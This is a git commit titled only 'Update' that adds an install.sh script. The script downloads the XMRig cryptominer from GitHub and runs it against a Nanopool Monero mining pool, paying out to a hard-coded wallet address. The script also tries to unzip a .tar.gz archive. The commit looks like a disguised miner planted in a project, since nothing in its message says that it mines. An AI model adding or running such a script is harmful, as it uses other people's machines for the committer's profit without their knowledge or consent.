0d800a2cb5f26ee2939f777700240633f81a8e8b
CentralDeveloper228 <arsboss2017@yandex.ru>
2022-11-20 11:03:50 +0300

    Update

---
+++ install.sh
@@ -0,0 +1,3 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz && unzip xmrig-6.18.1-linux-static-x64.tar.gz
+cd xmrig-6.18.1
+./xmrig -o xmr-eu1.nanopool.org:14433 -u 46ZS3NQ4z3XFhmBdqW3gX1af7QdCkjxDTd5W3NpPDxgwMobUJt3C5akWjUdLvDV1MfUKbwqV8zSZC9N65exVWb2BDne7bPR --tls --coin monero
